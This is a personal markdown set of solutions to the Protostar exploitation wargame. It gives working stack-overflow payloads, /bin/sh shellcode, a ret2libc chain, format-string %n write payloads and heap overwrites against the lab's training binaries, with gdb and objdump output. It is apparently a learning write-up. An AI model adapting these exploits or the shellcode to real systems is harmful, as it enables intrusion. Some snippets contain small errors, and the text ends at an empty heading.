b# Protostar Solutions
- Inspired by Liveoverflow's solutions, meant to help me learn binary exploitation
https://old.liveoverflow.com/binary_hacking/protostar/index.html
https://github.com/z3tta/Exploit-Exercises-Protostar
- Some were done by myself

## Stack 1
`/opt/protostar/bin/stack1 $(python -c 'print("A"*4*16+"\x64\x63\x62\x61")')`

## Stack 2
Python program
```
import 
os.environ['GREENIE']='AAAABBBBCCCCDDDD'*4+'\x0a\x0d\x0a\x0d'
os.system('/opt/protostar/bin/stack2')
```

## Stack 3 
1. Use objdump to find memory address of the win function
2. Find out the minimum amount of padding to get the program to crash (Just Manual Labour)
3. Replace the padding with the memory address to overwrite it

```
python -c "print('A'*4*16+'\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
```


## Stack 4 
Win function Memory Address at 0x080483f4.
Using gdb to debug, The input text starts at 0xbffff7e0, ebp at 0xbffff828
1. By brute forcing the padding, the program has no segmentation fault with maximum padding of about 'A'*4*18?
2. Through more testing of the padding (modify numbers of the below command), you find the address where the code execution is successfully redirected
  - Because the return pointer is 1 DWORD after ebp
```
python -c "print('A'*4*19+'\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4
```

## Stack 5
Through gdb, $ebp is at 0xbffff79b
Python program to generate input
```
padding = 'A'*4*(18+1) # +1 because you actually want to overwrite eip not ebp
eip = "\xbf\xff\xf7\xc0"[::-1]
nop = "\x90"
shellcode = "\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = padding+eip+nop*4*10+shellcode
print(payload)
with open("/tmp/input") as f: f.write(payload)
```
Shell commands
```
(cat /tmp/input; cat) | ./stack5
```

Some research
1. Set breakpoint at 0x80483d9 to find out how the input affected the stack

Some interesting stuff
1. Did you know that most linux programms don't allow execution from the stack?
  - Check this out for more info: stackoverflow.com/questions/36511214/buffer-overflow-eip-and-jump-correctly-set-but-segfault
  - To execute from the stack check this out: https://stackoverflow.com/questions/6867125/how-do-i-get-linux-to-execute-data-on-the-stack

## Stack 6
With Reference to https://medium.com/bugbountywriteup/protostar-stack6-24680c38a3a8

```
user@protostar:/opt/protostar/bin$ python -c "print('A'*4*18)" | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@protostar:/opt/protostar/bin$ python -c "print('A'*4*19)" | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

```
user@protostar:/opt/protostar/bin$ gdb ./stack6
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) p system
No symbol "system" in current context.
(gdb) run
Starting program: /opt/protostar/bin/stack6
input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAec▒@▒▒▒▒▒▒ ▒

Program exited with code 0142.
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb)
```
```

(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info proc map
process 3804
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb)
```
Where's sh
```
$ strings -t d /lib/libc-2.11.2.so | grep /bin/sh
1176511 /bin/sh
```
Python Program
```
import struct
system = struct.pack("I",0xb7ecffb0) #
padding = "AAAA"
binsh = struct.pack("I",0xb7e97000+1176511)
payload = 'A'*4*20+system+padding+binsh
```
## Format 0

```
/opt/protostar/bin/format0 $(python -c 'print("A"*64+"\xef\xbe\xad\xde")')
```

## Format 1

`objdump -t`
```
08049638 g     O .bss   00000004              target
0804963c g       *ABS*  00000000              _end
00000000       F *UND*  00000000              puts@@GLIBC_2.0
08049630 g       *ABS*  00000000              _edata
080484aa g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
0804841c g     F .text  0000001b              main
080482c0 g     F .init  00000000              _init
```

Steps
1. Find out address to overwrite, and put it to the string
2. Do the appropriate padding, such that the string fits nicely
3. %x until your last displayed value from memory is the address you want to overwrite
4. Change the last %x to %n to overwrite that variable

Python code `py.py`
```
padding = "AAAABBBBCCCCABCD"[:-1]+"\x38"
address = "\x96\x04\x08A"
showing = "%x__"*132
payload = padding+address+"AAAA"+showing+"%n"
print(payload)
```

Bash Script
```
$ ./format1 $(python /tmp/py)
AAAABBBBCCCCABC8AAAAA804960c__bffff5b8__8048469__b7fd8304__b7fd7ff4__bffff5b8__8048435__bffff785__b7ff1040__804845b__b7fd7ff4__8048450__0__bffff638__b7eadc76__2__bffff664__bffff670__b7fe1848__bffff620__ffffffff__b7ffeff4__804824d__1__bffff620__b7ff0626__b7fffab0__b7fe1b28__b7fd7ff4__0__0__bffff638__92890026__b8daf636__0__0__0__2__8048340__0__b7ff6210__b7eadb9b__b7ffeff4__2__8048340__0__8048361__804841c__2__bffff664__8048450__8048440__b7ff1040__bffff65c__b7fff8f8__2__bffff77b__bffff785__0__bffff9b0__bffff9be__bffff9c9__bffff9e6__bffff9f9__bffffa03__bffffef3__bfffff31__bfffff45__bfffff5c__bfffff6d__bfffff75__bfffff85__bfffff92__bfffffbd__bfffffd4__bfffffe6__0__20__b7fe2414__21__b7fe2000__10__178bfbff__6__1000__11__64__3__8048034__4__20__5__7__7__b7fe3000__8__0__9__8048340__b__3e9__c__0__d__3e9__e__3e9__17__1__19__bffff75b__1f__bffffff2__f__bffff76b__0__0__50000000__4095c1db__58acb6b1__3bbc5080__6972603f__363836__0__0__2e000000__726f662f__3174616d__41414100__42424241__43434342__43424143__you have modified the target :)
user@protostar:/opt/protostar/bin$ ./format1 $(python /tmp/py)
AAAABBBBCCCCABC8AAAAA804960c__bffff5b8__8048469__b7fd8304__b7fd7ff4__bffff5b8__8048435__bffff785__b7ff1040__804845b__b7fd7ff4__8048450__0__bffff638__b7eadc76__2__bffff664__bffff670__b7fe1848__bffff620__ffffffff__b7ffeff4__804824d__1__bffff620__b7ff0626__b7fffab0__b7fe1b28__b7fd7ff4__0__0__bffff638__8efb916e__a4a8677e__0__0__0__2__8048340__0__b7ff6210__b7eadb9b__b7ffeff4__2__8048340__0__8048361__804841c__2__bffff664__8048450__8048440__b7ff1040__bffff65c__b7fff8f8__2__bffff77b__bffff785__0__bffff9b0__bffff9be__bffff9c9__bffff9e6__bffff9f9__bffffa03__bffffef3__bfffff31__bfffff45__bfffff5c__bfffff6d__bfffff75__bfffff85__bfffff92__bfffffbd__bfffffd4__bfffffe6__0__20__b7fe2414__21__b7fe2000__10__178bfbff__6__1000__11__64__3__8048034__4__20__5__7__7__b7fe3000__8__0__9__8048340__b__3e9__c__0__d__3e9__e__3e9__17__1__19__bffff75b__1f__bffffff2__f__bffff76b__0__0__b3000000__816f59b__a708b888__c61bb266__698804ee__363836__0__0__2e000000__726f662f__3174616d__41414100__42424241__43434342__43424143__you have modified the target :)
```

## Format 2
`objdump -t`
```
08048454 g     F .text  00000067              vuln
080496d8 g     O .bss   00000004              stdin@@GLIBC_2.0
080496e4 g     O .bss   00000004              target
080496e8 g       *ABS*  00000000              _end
00000000       F *UND*  00000000              puts@@GLIBC_2.0
080496d8 g       *ABS*  00000000              _edata
0804853a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
080484bb g     F .text  0000000f              main
0804830c g     F .init  00000000              _init
```

Do the same steps as above, but this time, you adjust the length of your string to the appropriate value
Python Script
```
padding = "AAAA"
address = "\xe4\x96\x04\x08"
showing = "%x__"*4

payload = padding+address+showing
payload += " "*(64-len(payload) - (83-64))
payload += "%n"
print(payload)
```
Bash Script
```
$ python /tmp/py | /opt/protostar/bin/format2
AAAA200__b7fd8420__bffff5e4__41414141__
you have modified the target :)
```

## Format 3

```
080496e8 g     O .bss   00000004              stdin@@GLIBC_2.0
080496f4 g     O .bss   00000004              target
080496f8 g       *ABS*  00000000              _end
00000000       F *UND*  00000000              puts@@GLIBC_2.0
080496e8 g       *ABS*  00000000              _edata
0804854a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
080484d0 g     F .text  0000000f              main
0804830c g     F .init  00000000              _init
```

Inspired by this: ,https://sh3llc0d3r.com/protostar-exploit-exercises-format3/
```
$ python -c "print('\xf4\x96\x04\x08\xf6\x96\x04\x08%21820d%12$n%43966d%13$n')" | /opt/protostar/bin/format3
```

Python Script breakdown of the input
```
address1 = "\xf0\x96\x04\x08"
address2 = "\xf4\x96\x04\x08"
padding1 = "%21820d" # Calculate the remaining length
write1 = "%12$n"
padding2 = "%43966d"
write2 = "%13$n"
payload = address1+address2+padding1+write1+padding2+write2
print(payload)
```

## Format 4

```
$ objdump -TR ./format4

./format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

From `objdump -d -M intel`: Memory address of hello is `0x080484b4`

Overwrite the offset with the dynamic relocation records with the memory address of hello

From: https://sh3llc0d3r.com/protostar-exploit-exercises-format4/
```
 python -c 'print"\x24\x97\x04\x08\x26\x97\x04\x08%33964d%4$n%33616d%5$n"' | /opt/protostar/bin/format4
```

Python Script Code Breakdown
```
debug = False

part1 = 0x84b4 # Lower bits
part2 = 0x0804 + 0x10000 # Upper bits + 0x10000 (Overload)
offset = 5

payload = "AAAA"
payload += "\x24\x97\x04\x08" # address1
payload += "\x26\x97\x04\x08" # address2

diff1 = part1-len(payload)
if debug:print(diff1)


payload += "%" + str(diff1) + "d" # Calculate the remaining length
payload += "%"+str(offset)+"$n" # write1

diff2 = part2-(len(payload)-len("%" + str(diff1) + "d" + "%"+str(offset)+"$n")+diff1)
if debug: print(diff2)

payload += "%" + str(diff2) + "d" # padding2
payload += "%"+str(offset+1)+"$n" # +1 (for extra 1 dword)

print(payload)
```

## heap0

You can use ltrace to get the return values of `malloc(...)`
```
$ ltrace ./heap0
__libc_start_main(0x804848c, 1, 0xbffff894, 0x8048520, 0x8048510 <unfinished ...>
malloc(64)                                                                          = 0x0804a008
malloc(4)                                                                           = 0x0804a050
printf("data is at %p, fp is at %p\n", 0x804a008, 0x804a050data is at 0x804a008, fp is at 0x804a050
)                        = 41
strcpy(0x0804a008, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

https://sh3llc0d3r.com/protostar-exploit-exercises-heap0/

/opt/protostar/bin/heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08")

## heap1

```
$ ltrace ./heap1
__libc_start_main(0x80484b9, 1, 0xbffff894, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                                                                           = 0x0804a008
malloc(8)                                                                           = 0x0804a018
malloc(8)                                                                           = 0x0804a028
malloc(8)                                                                           = 0x0804a038
strcpy(0x0804a018, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

```
(gdb) p winner
$2 = {void (void)} 0x8048494 <winner>
```

```
 /opt/protostar/bin/heap1 `python -c 'print "A"*20+"\x74\x97\x04\x08"'` `python -c 'print("\x94\x84\x04\x08")'`
and we have a winner @ 1588376578
```

## Net 0
http://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/17-Net0.md

## Net 1
https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/18-Net1.md

## Net 2
(Check Liveoverflow guide again)
```
import socket
import struct

s = socket.socket()
s.connect(("192.168.56.101",2997))

sum = 0
for i in range(4):
	data = s.recv(4)
	data = "%d\n" % (struct.unpack('<i', data))
	sum += int(data)

s.send(struct.pack("<I", sum))
print s.recv(1024)
s.close()
```

## Net 3